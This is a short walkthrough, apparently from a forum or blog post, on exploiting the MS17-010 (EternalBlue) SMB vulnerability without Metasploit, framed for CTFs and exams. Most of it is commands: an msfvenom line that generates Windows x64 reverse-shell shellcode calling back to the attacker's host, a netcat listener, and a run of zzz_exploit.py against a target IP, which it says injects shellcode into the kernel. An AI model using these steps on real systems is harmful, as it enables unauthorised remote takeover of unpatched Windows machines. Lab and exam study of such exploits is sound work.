There is many of ways, to exploit that vulnerability MS17-010



1. The Python Script Route (AutoBlue / zzz_exploit) + Custom Shellcode
This is the closest alternative to Metasploit and the community favorite for CTFs and exams. Instead of a pre-packaged framework module, you use customized Python scripts (based on the Shadow Brokers leaks) paired with a manually generated payload.

Step-by-Step Walkthrough:
Generate a raw shellcode using msfvenom tailored to your listener:
```terminal
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f raw -o sc.bin
```
Set up a listener on your local machine:
```terminal
nc -lvnp <YOUR_PORT>
```
Run the exploit script (such as zzz_exploit.py or eternalblue_exploit8.py from repositories like AutoBlue-MS17-010):
```terminal
python3 zzz_exploit.py <TARGET_IP> sc.bin
```
The script handles the memory corruption and injects your custom shellcode directly into the kernel, spawning a reverse shell straight to your netcat listener.
